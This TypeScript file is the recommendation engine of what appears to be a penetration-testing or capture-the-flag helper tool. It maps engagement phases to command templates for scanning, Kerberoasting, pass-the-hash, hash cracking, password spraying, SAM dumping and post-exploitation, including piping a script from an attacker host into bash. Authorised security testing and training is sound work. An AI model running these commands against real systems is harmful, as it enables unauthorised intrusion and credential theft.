/**
 * Recommendation Engine for B.R.E.A.C.H.
 *
 * Generates contextual command recommendations based on current attack phase.
 * Phases: initial_recon, service_enum, credential_usage, loot_processing, post_exploitation
 */

import type { ServiceInfo } from '../types/actions-panel';
import type { Credential } from '../types/credential';
import { substituteCredential } from '../types/credential';
import type { Loot, PatternType } from '../types/loot';
import type { TerminalSession } from '../types/session';
import type {
  AttackPhase,
  RecommendedAction,
  RecommendationResult,
  RecommendationContext,
} from '../types/recommendation';
import {
  PHASE_LABELS,
  ACTIONABLE_LOOT_PATTERNS,
  hasActionableLoot,
  hasActiveShell,
} from '../types/recommendation';

// =============================================================================
// PHASE DETECTION
// =============================================================================

/**
 * Detect current attack phase based on engagement state
 */
export function detectPhase(
  services: ServiceInfo[],
  credentials: Credential[],
  loot: Loot[] = [],
  sessions: TerminalSession[] = []
): AttackPhase {
  // Phase 5: Post Exploitation - have an active shell
  if (hasActiveShell(sessions)) {
    return 'post_exploitation';
  }

  // Phase 4: Loot Processing - have actionable loot (GPP, hashes, etc.)
  if (hasActionableLoot(loot)) {
    return 'loot_processing';
  }

  // Phase 3: Credential Usage - have credentials to use
  if (credentials.length > 0) {
    return 'credential_usage';
  }

  // Phase 2: Service Enumeration - have services but no creds
  if (services.length > 0) {
    return 'service_enum';
  }

  // Phase 1: Initial Recon - nothing discovered yet
  return 'initial_recon';
}

/**
 * Get human-readable reason for current phase
 */
export function getPhaseReason(
  phase: AttackPhase,
  services: ServiceInfo[],
  credentials: Credential[],
  loot: Loot[] = [],
  sessions: TerminalSession[] = []
): string {
  switch (phase) {
    case 'initial_recon':
      return 'No services discovered - start with port scanning';
    case 'service_enum':
      return `${services.length} service${services.length !== 1 ? 's' : ''} found - enumerate for vulnerabilities`;
    case 'credential_usage':
      return `${credentials.length} credential${credentials.length !== 1 ? 's' : ''} available - attempt lateral movement`;
    case 'loot_processing': {
      const actionable = loot.filter((l) =>
        l.detectedPatterns.some((p) => ACTIONABLE_LOOT_PATTERNS.includes(p))
      );
      return `${actionable.length} loot item${actionable.length !== 1 ? 's' : ''} with extractable data - process before continuing`;
    }
    case 'post_exploitation': {
      const shells = sessions.filter(
        (s) => s.type === 'shell' && (s.status === 'running' || s.status === 'backgrounded')
      );
      return `${shells.length} active shell${shells.length !== 1 ? 's' : ''} - escalate privileges and extract data`;
    }
    default:
      return '';
  }
}

// =============================================================================
// PREREQUISITE CHECKING
// =============================================================================

/**
 * Check if any of the required ports are open
 */
function hasPort(services: ServiceInfo[], ports: number[]): boolean {
  return services.some((s) => ports.includes(s.port));
}

/**
 * Check if a service name matches
 */
function hasServiceName(services: ServiceInfo[], names: string[]): boolean {
  return services.some((s) => {
    if (!s.service_name) return false;
    const lower = s.service_name.toLowerCase();
    return names.some((n) => lower.includes(n.toLowerCase()));
  });
}

/**
 * Check if we have a credential of the specified type
 */
function hasCredentialType(
  credentials: Credential[],
  type: 'password' | 'ntlm' | 'any'
): boolean {
  if (type === 'any') return credentials.length > 0;
  if (type === 'password') {
    return credentials.some((c) => ['password', 'gpp'].includes(c.secretType));
  }
  if (type === 'ntlm') {
    return credentials.some((c) => ['ntlm', 'sam'].includes(c.secretType));
  }
  return false;
}

/**
 * Check if loot contains a specific pattern
 */
function hasLootPattern(loot: Loot[], pattern: PatternType): boolean {
  return loot.some((l) => l.detectedPatterns.includes(pattern));
}

/**
 * Get loot items with a specific pattern
 */
function getLootWithPattern(loot: Loot[], pattern: PatternType): Loot[] {
  return loot.filter((l) => l.detectedPatterns.includes(pattern));
}

// =============================================================================
// RECOMMENDATION GENERATORS
// =============================================================================

/**
 * Generate recommendations for initial recon phase
 */
function generateInitialRecon(targetIp: string): RecommendedAction[] {
  return [
    {
      id: 'rec-nmap-quick',
      phase: 'initial_recon',
      score: 90,
      label: 'Quick Nmap Scan',
      command: `nmap -sC -sV ${targetIp}`,
      rationale: 'Start here - discovers common services with version detection',
    },
    {
      id: 'rec-nmap-full',
      phase: 'initial_recon',
      score: 75,
      label: 'Full Port Scan',
      command: `nmap -p- --min-rate=1000 ${targetIp}`,
      rationale: 'Comprehensive scan - finds services on non-standard ports',
    },
    {
      id: 'rec-nmap-udp',
      phase: 'initial_recon',
      score: 60,
      label: 'UDP Top 20',
      command: `sudo nmap -sU --top-ports=20 ${targetIp}`,
      rationale: 'Check UDP services like SNMP, DNS, TFTP',
    },
  ];
}

/**
 * Generate recommendations for service enumeration phase
 */
function generateServiceEnum(
  services: ServiceInfo[],
  targetIp: string,
  domain?: string
): RecommendedAction[] {
  const recommendations: RecommendedAction[] = [];

  // SMB enumeration (ports 139, 445)
  if (hasPort(services, [139, 445]) || hasServiceName(services, ['smb', 'microsoft-ds', 'netbios'])) {
    recommendations.push({
      id: 'rec-smb-null',
      phase: 'service_enum',
      score: 85,
      label: 'SMB Null Session',
      command: `smbclient -N -L //${targetIp}`,
      rationale: 'SMB detected - check for anonymous share access',
      requiresPorts: [139, 445],
    });
    recommendations.push({
      id: 'rec-enum4linux',
      phase: 'service_enum',
      score: 80,
      label: 'enum4linux Full Scan',
      command: `enum4linux -a ${targetIp}`,
      rationale: 'SMB detected - enumerate users, shares, and policies',
      requiresPorts: [139, 445],
    });
    recommendations.push({
      id: 'rec-smbmap',
      phase: 'service_enum',
      score: 78,
      label: 'SMBMap Permissions',
      command: `smbmap -H ${targetIp}`,
      rationale: 'SMB detected - check share permissions',
      requiresPorts: [139, 445],
    });
  }

  // Kerberos enumeration (port 88) - indicates DC
  if (hasPort(services, [88]) || hasServiceName(services, ['kerberos'])) {
    const domainArg = domain || '<DOMAIN>';
    recommendations.push({
      id: 'rec-kerbrute-users',
      phase: 'service_enum',
      score: 82,
      label: 'Kerbrute User Enum',
      command: `kerbrute userenum --dc ${targetIp} -d ${domainArg} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`,
      rationale: 'Kerberos detected (DC) - enumerate valid domain users',
      requiresPort: 88,
    });
    recommendations.push({
      id: 'rec-asreproast-anon',
      phase: 'service_enum',
      score: 78,
      label: 'AS-REP Roast (no auth)',
      command: `GetNPUsers.py ${domainArg}/ -usersfile users.txt -dc-ip ${targetIp} -format hashcat`,
      rationale: 'Kerberos detected - find users without preauth required',
      requiresPort: 88,
    });
  }

  // HTTP enumeration (ports 80, 443, 8080, etc.)
  if (
    hasPort(services, [80, 443, 8080, 8443, 8000, 8888]) ||
    hasServiceName(services, ['http', 'https', 'apache', 'nginx', 'iis'])
  ) {
    const httpPort = services.find((s) => [80, 443, 8080, 8443, 8000, 8888].includes(s.port))?.port || 80;
    const proto = [443, 8443].includes(httpPort) ? 'https' : 'http';
    const url = httpPort === 80 || httpPort === 443 ? `${proto}://${targetIp}` : `${proto}://${targetIp}:${httpPort}`;

    recommendations.push({
      id: 'rec-gobuster',
      phase: 'service_enum',
      score: 80,
      label: 'Gobuster Directory',
      command: `gobuster dir -u ${url} -w /usr/share/wordlists/dirb/common.txt`,
      rationale: 'HTTP detected - discover hidden directories and files',
      requiresPorts: [80, 443, 8080, 8443, 8000, 8888],
    });
    recommendations.push({
      id: 'rec-nikto',
      phase: 'service_enum',
      score: 70,
      label: 'Nikto Vulnerability Scan',
      command: `nikto -h ${url}`,
      rationale: 'HTTP detected - check for common web vulnerabilities',
      requiresPorts: [80, 443, 8080, 8443],
    });
    recommendations.push({
      id: 'rec-whatweb',
      phase: 'service_enum',
      score: 75,
      label: 'WhatWeb Fingerprint',
      command: `whatweb ${url}`,
      rationale: 'HTTP detected - identify web technologies',
      requiresPorts: [80, 443, 8080, 8443],
    });
  }

  // LDAP enumeration (ports 389, 636)
  if (hasPort(services, [389, 636, 3268, 3269]) || hasServiceName(services, ['ldap'])) {
    recommendations.push({
      id: 'rec-ldapsearch-anon',
      phase: 'service_enum',
      score: 78,
      label: 'LDAP Anonymous Bind',
      command: `ldapsearch -x -H ldap://${targetIp} -b "" -s base namingContexts`,
      rationale: 'LDAP detected - check for anonymous access',
      requiresPorts: [389, 636],
    });
  }

  // FTP enumeration (port 21)
  if (hasPort(services, [21]) || hasServiceName(services, ['ftp'])) {
    recommendations.push({
      id: 'rec-ftp-anon',
      phase: 'service_enum',
      score: 75,
      label: 'FTP Anonymous Login',
      command: `ftp ${targetIp}`,
      rationale: 'FTP detected - try anonymous login (user: anonymous)',
      requiresPort: 21,
    });
  }

  // SNMP enumeration (port 161)
  if (hasPort(services, [161]) || hasServiceName(services, ['snmp'])) {
    recommendations.push({
      id: 'rec-snmpwalk',
      phase: 'service_enum',
      score: 75,
      label: 'SNMP Walk (public)',
      command: `snmpwalk -v2c -c public ${targetIp}`,
      rationale: 'SNMP detected - enumerate with default community string',
      requiresPort: 161,
    });
  }

  // NFS enumeration (port 2049)
  if (hasPort(services, [2049]) || hasServiceName(services, ['nfs'])) {
    recommendations.push({
      id: 'rec-showmount',
      phase: 'service_enum',
      score: 78,
      label: 'NFS Show Exports',
      command: `showmount -e ${targetIp}`,
      rationale: 'NFS detected - list exported shares',
      requiresPort: 2049,
    });
  }

  return recommendations;
}

/**
 * Generate recommendations for credential usage phase
 */
function generateCredentialUsage(
  services: ServiceInfo[],
  credentials: Credential[],
  targetIp: string
): RecommendedAction[] {
  const recommendations: RecommendedAction[] = [];

  // Get cleartext credentials
  const passwordCreds = credentials.filter((c) =>
    ['password', 'gpp'].includes(c.secretType)
  );

  // Get NTLM hash credentials
  const ntlmCreds = credentials.filter((c) =>
    ['ntlm', 'sam'].includes(c.secretType)
  );

  // For each cleartext credential
  for (const cred of passwordCreds) {
    // Kerberoast (if Kerberos available)
    if (hasPort(services, [88]) && cred.domain) {
      recommendations.push({
        id: `rec-kerberoast-${cred.id}`,
        phase: 'credential_usage',
        score: 88,
        label: `Kerberoast as ${cred.username}`,
        command: substituteCredential(
          'GetUserSPNs.py "<DOMAIN>/<USER>:<PASS>" -dc-ip <IP> -request',
          cred,
          targetIp
        ),
        rationale: 'Valid creds + Kerberos - extract crackable TGS hashes',
        requiresPort: 88,
        requiresCredential: true,
        credentialId: cred.id,
      });
    }

    // Evil-WinRM (if WinRM available)
    if (hasPort(services, [5985, 5986])) {
      recommendations.push({
        id: `rec-evil-winrm-${cred.id}`,
        phase: 'credential_usage',
        score: 92,
        label: `Evil-WinRM as ${cred.username}`,
        command: substituteCredential(
          'evil-winrm -i <IP> -u "<USER>" -p "<PASS>"',
          cred,
          targetIp
        ),
        rationale: 'Valid creds + WinRM open - get interactive shell',
        requiresPorts: [5985, 5986],
        requiresCredential: true,
        credentialId: cred.id,
      });
    }

    // SMB enumeration as user (if SMB available)
    if (hasPort(services, [445])) {
      recommendations.push({
        id: `rec-smbmap-auth-${cred.id}`,
        phase: 'credential_usage',
        score: 80,
        label: `SMBMap as ${cred.username}`,
        command: substituteCredential(
          'smbmap -u "<USER>" -p "<PASS>" -d "<DOMAIN>" -H <IP>',
          cred,
          targetIp
        ),
        rationale: 'Valid creds - check for additional share access',
        requiresPort: 445,
        requiresCredential: true,
        credentialId: cred.id,
      });
    }

    // PSExec (if SMB available, try for shell)
    if (hasPort(services, [445]) && cred.domain) {
      recommendations.push({
        id: `rec-psexec-${cred.id}`,
        phase: 'credential_usage',
        score: 85,
        label: `PSExec as ${cred.username}`,
        command: substituteCredential(
          'psexec.py "<DOMAIN>/<USER>:<PASS>@<IP>"',
          cred,
          targetIp
        ),
        rationale: 'Try for SYSTEM shell via SMB (requires local admin)',
        requiresPort: 445,
        requiresCredential: true,
        credentialId: cred.id,
      });
    }

    // BloodHound collection (if DC ports available)
    if (hasPort(services, [88, 389]) && cred.domain) {
      recommendations.push({
        id: `rec-bloodhound-${cred.id}`,
        phase: 'credential_usage',
        score: 82,
        label: `BloodHound as ${cred.username}`,
        command: substituteCredential(
          'bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -dc <IP> -c All',
          cred,
          targetIp
        ),
        rationale: 'Valid domain creds - collect AD attack paths',
        requiresPorts: [88, 389],
        requiresCredential: true,
        credentialId: cred.id,
      });
    }
  }

  // For NTLM hash credentials (Pass-the-Hash)
  for (const cred of ntlmCreds) {
    // PTH with CrackMapExec
    if (hasPort(services, [445])) {
      recommendations.push({
        id: `rec-pth-cme-${cred.id}`,
        phase: 'credential_usage',
        score: 86,
        label: `PTH CME as ${cred.username}`,
        command: substituteCredential(
          'crackmapexec smb <IP> -u "<USER>" -H "<HASH>" -d "<DOMAIN>"',
          cred,
          targetIp
        ),
        rationale: 'NTLM hash - test for local admin via Pass-the-Hash',
        requiresPort: 445,
        requiresCredential: true,
        requiresCredentialType: 'ntlm',
        credentialId: cred.id,
      });
    }

    // PTH Evil-WinRM
    if (hasPort(services, [5985, 5986])) {
      recommendations.push({
        id: `rec-pth-winrm-${cred.id}`,
        phase: 'credential_usage',
        score: 88,
        label: `PTH WinRM as ${cred.username}`,
        command: substituteCredential(
          'evil-winrm -i <IP> -u "<USER>" -H "<HASH>"',
          cred,
          targetIp
        ),
        rationale: 'NTLM hash + WinRM - get shell via Pass-the-Hash',
        requiresPorts: [5985, 5986],
        requiresCredential: true,
        requiresCredentialType: 'ntlm',
        credentialId: cred.id,
      });
    }

    // PTH PSExec
    if (hasPort(services, [445])) {
      recommendations.push({
        id: `rec-pth-psexec-${cred.id}`,
        phase: 'credential_usage',
        score: 84,
        label: `PTH PSExec as ${cred.username}`,
        command: substituteCredential(
          'psexec.py "<DOMAIN>/<USER>@<IP>" -hashes :<HASH>',
          cred,
          targetIp
        ),
        rationale: 'NTLM hash - get SYSTEM shell via Pass-the-Hash',
        requiresPort: 445,
        requiresCredential: true,
        requiresCredentialType: 'ntlm',
        credentialId: cred.id,
      });
    }
  }

  return recommendations;
}

/**
 * Generate recommendations for loot processing phase
 * Triggered when actionable patterns (GPP, hashes, SSH keys) are detected in loot
 */
function generateLootProcessing(
  loot: Loot[],
  targetIp: string
): RecommendedAction[] {
  const recommendations: RecommendedAction[] = [];

  // GPP Password decryption
  const gppLoot = getLootWithPattern(loot, 'gpp_password');
  for (const item of gppLoot) {
    const cpassword = item.extractedData?.gpp_password || '<CPASSWORD>';
    recommendations.push({
      id: `rec-gpp-decrypt-${item.id}`,
      phase: 'loot_processing',
      score: 95,
      label: `Decrypt GPP from ${item.name}`,
      command: `gpp-decrypt "${cpassword}"`,
      rationale: 'GPP password found - decrypt to get plaintext credentials',
      requiresLootPattern: 'gpp_password',
      lootId: item.id,
      nextSteps: ['rec-kerberoast', 'rec-smb-auth', 'rec-evil-winrm'],
    });
  }

  // Kerberos TGS hash cracking
  const kerbLoot = getLootWithPattern(loot, 'kerberos_hash');
  for (const item of kerbLoot) {
    const hashFile = item.path || 'kerberoast.txt';
    recommendations.push({
      id: `rec-crack-kerb-${item.id}`,
      phase: 'loot_processing',
      score: 92,
      label: `Crack Kerberos hash from ${item.name}`,
      command: `hashcat -m 13100 ${hashFile} /usr/share/wordlists/rockyou.txt --force`,
      rationale: 'Kerberos TGS hash found - crack to get service account password',
      requiresLootPattern: 'kerberos_hash',
      lootId: item.id,
      nextSteps: ['rec-evil-winrm', 'rec-psexec', 'rec-secretsdump'],
    });
    // Also suggest john
    recommendations.push({
      id: `rec-john-kerb-${item.id}`,
      phase: 'loot_processing',
      score: 88,
      label: `Crack with John (Kerberos)`,
      command: `john --wordlist=/usr/share/wordlists/rockyou.txt ${hashFile}`,
      rationale: 'Alternative: Use John the Ripper for hash cracking',
      requiresLootPattern: 'kerberos_hash',
      lootId: item.id,
    });
  }

  // NTLM hash cracking
  const ntlmLoot = getLootWithPattern(loot, 'ntlm_hash');
  for (const item of ntlmLoot) {
    const hashFile = item.path || 'ntlm_hashes.txt';
    recommendations.push({
      id: `rec-crack-ntlm-${item.id}`,
      phase: 'loot_processing',
      score: 90,
      label: `Crack NTLM hash from ${item.name}`,
      command: `hashcat -m 1000 ${hashFile} /usr/share/wordlists/rockyou.txt --force`,
      rationale: 'NTLM hash found - crack or use for PTH attacks',
      requiresLootPattern: 'ntlm_hash',
      lootId: item.id,
      nextSteps: ['rec-pth-cme', 'rec-pth-winrm', 'rec-pth-psexec'],
    });
    // PTH suggestion (don't need to crack if can pass)
    recommendations.push({
      id: `rec-pth-ntlm-${item.id}`,
      phase: 'loot_processing',
      score: 85,
      label: `Pass-the-Hash (skip cracking)`,
      command: `crackmapexec smb ${targetIp} -u "<USER>" -H "<HASH>"`,
      rationale: 'NTLM hash - try PTH directly instead of cracking',
      requiresLootPattern: 'ntlm_hash',
      lootId: item.id,
    });
  }

  // SSH key usage
  const sshLoot = getLootWithPattern(loot, 'ssh_key');
  for (const item of sshLoot) {
    recommendations.push({
      id: `rec-ssh-key-${item.id}`,
      phase: 'loot_processing',
      score: 93,
      label: `Use SSH key from ${item.name}`,
      command: `chmod 600 ${item.path} && ssh -i ${item.path} <USER>@${targetIp}`,
      rationale: 'SSH private key found - use for authentication',
      requiresLootPattern: 'ssh_key',
      lootId: item.id,
    });
    // Check if key is encrypted
    recommendations.push({
      id: `rec-ssh-key-crack-${item.id}`,
      phase: 'loot_processing',
      score: 80,
      label: `Crack SSH key passphrase`,
      command: `ssh2john ${item.path} > ssh_hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt`,
      rationale: 'SSH key may be encrypted - try cracking passphrase',
      requiresLootPattern: 'ssh_key',
      lootId: item.id,
    });
  }

  // Password in file
  const pwdLoot = getLootWithPattern(loot, 'password_in_file');
  for (const item of pwdLoot) {
    const password = item.extractedData?.password_in_file || '<PASSWORD>';
    recommendations.push({
      id: `rec-pwd-spray-${item.id}`,
      phase: 'loot_processing',
      score: 82,
      label: `Try discovered password`,
      command: `crackmapexec smb ${targetIp} -u users.txt -p "${password}" --continue-on-success`,
      rationale: `Password "${password.substring(0, 8)}..." found in ${item.name} - try password spray`,
      requiresLootPattern: 'password_in_file',
      lootId: item.id,
    });
  }

  return recommendations;
}

/**
 * Generate recommendations for post-exploitation phase
 * Triggered when an active shell session is detected
 */
function generatePostExploitation(
  sessions: TerminalSession[],
  services: ServiceInfo[],
  credentials: Credential[],
  targetIp: string
): RecommendedAction[] {
  const recommendations: RecommendedAction[] = [];

  // Get active shell sessions
  const activeShells = sessions.filter(
    (s) => s.type === 'shell' && (s.status === 'running' || s.status === 'backgrounded')
  );

  // Basic enumeration (always recommend)
  recommendations.push({
    id: 'rec-whoami',
    phase: 'post_exploitation',
    score: 95,
    label: 'Check current user',
    command: 'whoami /all',
    rationale: 'First step - identify current user and privileges',
    requiresShell: true,
  });

  // Windows vs Linux detection (recommend both, user will know which applies)
  recommendations.push({
    id: 'rec-winpeas',
    phase: 'post_exploitation',
    score: 90,
    label: 'WinPEAS Enumeration',
    command: 'curl http://<LHOST>/winPEASx64.exe -o winpeas.exe && .\\winpeas.exe',
    rationale: 'Windows privilege escalation - comprehensive automated enum',
    requiresShell: true,
    nextSteps: ['rec-secretsdump', 'rec-mimikatz'],
  });

  recommendations.push({
    id: 'rec-linpeas',
    phase: 'post_exploitation',
    score: 90,
    label: 'LinPEAS Enumeration',
    command: 'curl http://<LHOST>/linpeas.sh | bash',
    rationale: 'Linux privilege escalation - comprehensive automated enum',
    requiresShell: true,
  });

  // Manual enum commands
  recommendations.push({
    id: 'rec-suid',
    phase: 'post_exploitation',
    score: 85,
    label: 'Find SUID Binaries',
    command: 'find / -perm -u=s -type f 2>/dev/null',
    rationale: 'Linux privesc - find binaries with SUID bit set',
    requiresShell: true,
  });

  recommendations.push({
    id: 'rec-sudo-l',
    phase: 'post_exploitation',
    score: 88,
    label: 'Check sudo rights',
    command: 'sudo -l',
    rationale: 'Linux privesc - check if user has sudo permissions',
    requiresShell: true,
  });

  recommendations.push({
    id: 'rec-net-user',
    phase: 'post_exploitation',
    score: 82,
    label: 'Enumerate local users',
    command: 'net user',
    rationale: 'Windows - enumerate local user accounts',
    requiresShell: true,
  });

  recommendations.push({
    id: 'rec-net-localgroup',
    phase: 'post_exploitation',
    score: 82,
    label: 'Check admin group',
    command: 'net localgroup administrators',
    rationale: 'Windows - check who has local admin',
    requiresShell: true,
  });

  // If we have admin creds and SMB, recommend secretsdump
  if (hasPort(services, [445]) && credentials.length > 0) {
    const adminCred = credentials.find(
      (c) => c.username.toLowerCase().includes('admin') || c.notes?.toLowerCase().includes('admin')
    );
    if (adminCred) {
      recommendations.push({
        id: 'rec-secretsdump',
        phase: 'post_exploitation',
        score: 94,
        label: 'Secretsdump (dump SAM)',
        command: substituteCredential(
          'secretsdump.py "<DOMAIN>/<USER>:<PASS>@<IP>"',
          adminCred,
          targetIp
        ),
        rationale: 'Admin creds available - dump SAM database for all hashes',
        requiresPort: 445,
        requiresCredential: true,
        credentialId: adminCred.id,
      });
    }
  }

  // Flag capture reminders
  recommendations.push({
    id: 'rec-find-flags',
    phase: 'post_exploitation',
    score: 75,
    label: 'Search for flags',
    command: 'find / -name "*.txt" -o -name "user.txt" -o -name "root.txt" 2>/dev/null | head -20',
    rationale: 'Search for flag files (user.txt, root.txt)',
    requiresShell: true,
  });

  recommendations.push({
    id: 'rec-find-flags-win',
    phase: 'post_exploitation',
    score: 75,
    label: 'Search flags (Windows)',
    command: 'dir /s /b C:\\Users\\*flag* C:\\Users\\*user.txt C:\\Users\\*root.txt 2>nul',
    rationale: 'Windows - search for flag files',
    requiresShell: true,
  });

  return recommendations;
}

// =============================================================================
// MAIN ENGINE
// =============================================================================

/**
 * Generate recommendations based on current engagement state
 */
export function getRecommendations(context: RecommendationContext): RecommendationResult {
  const { services, credentials, loot, sessions, targetIp, domain } = context;

  // 1. Detect current phase (now considers loot and sessions)
  const phase = detectPhase(services, credentials, loot, sessions);
  const phaseReason = getPhaseReason(phase, services, credentials, loot, sessions);

  // 2. Generate phase-specific recommendations
  let recommendations: RecommendedAction[] = [];

  switch (phase) {
    case 'initial_recon':
      recommendations = generateInitialRecon(targetIp);
      break;
    case 'service_enum':
      recommendations = generateServiceEnum(services, targetIp, domain);
      break;
    case 'credential_usage':
      recommendations = generateCredentialUsage(services, credentials, targetIp);
      break;
    case 'loot_processing':
      recommendations = generateLootProcessing(loot, targetIp);
      break;
    case 'post_exploitation':
      recommendations = generatePostExploitation(sessions, services, credentials, targetIp);
      break;
  }

  // 3. Filter by prerequisites and sort by score
  recommendations = recommendations
    .filter((r) => {
      // Check port prerequisite
      if (r.requiresPort && !hasPort(services, [r.requiresPort])) {
        return false;
      }
      if (r.requiresPorts && !hasPort(services, r.requiresPorts)) {
        return false;
      }
      // Check credential prerequisite
      if (r.requiresCredential && credentials.length === 0) {
        return false;
      }
      if (r.requiresCredentialType && !hasCredentialType(credentials, r.requiresCredentialType)) {
        return false;
      }
      // Check loot pattern prerequisite
      if (r.requiresLootPattern && !hasLootPattern(loot, r.requiresLootPattern)) {
        return false;
      }
      // Check shell prerequisite
      if (r.requiresShell && !hasActiveShell(sessions)) {
        return false;
      }
      return true;
    })
    .sort((a, b) => b.score - a.score)
    .slice(0, 5); // Top 5

  return {
    phase,
    phaseReason,
    recommendations,
  };
}

/**
 * Get phase label for display
 */
export function getPhaseLabel(phase: AttackPhase): string {
  return PHASE_LABELS[phase];
}
